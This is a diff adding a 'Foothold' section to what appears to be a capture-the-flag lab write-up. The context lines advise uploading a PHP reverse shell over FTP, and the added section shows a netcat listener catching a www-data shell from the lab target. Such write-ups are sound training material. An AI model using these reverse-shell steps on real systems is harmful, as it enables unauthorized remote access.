@@ -110,3 +110,20 @@ Now, the question is, of what? php? Well going to `http://10.10.109.61/index.php
 
 Let's try php rev shell anyways. Use [revshells](https://www.revshells.com/) and get one for yourself. `put` the file in `/ftp` folder. Start netcat on your specified port and ip.
 
+## 2. Foothold
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 1337      
+listening on [any] 1337 ...
+connect to [10.8.150.214] from (UNKNOWN) [10.10.109.61] 52074
+Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 10:53:18 up 24 min,  0 users,  load average: 0.00, 0.00, 0.06
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+bash: cannot set terminal process group (1233): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@startup:/$ 
+```
+
+And we are in!
+
